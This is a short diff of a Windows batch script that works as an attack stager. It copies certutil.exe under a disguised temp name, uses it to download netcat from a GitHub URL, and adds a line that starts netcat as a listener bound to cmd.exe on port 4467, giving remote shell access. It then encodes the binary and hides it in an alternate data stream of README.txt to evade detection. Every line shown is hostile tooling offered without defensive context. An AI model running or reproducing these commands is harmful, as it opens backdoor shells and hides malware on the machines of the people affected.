@@ -4,7 +4,7 @@ copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
-
+cmd.exe /C %Temp%\nc.exe -nLvp 4467 -e cmd.exe
 %temp%\cr.tmp -encode %Temp%\nc.exe %Temp%\nc.txt
 
 type %Temp%\nc.txt > %Temp%\README.txt:hid.txt
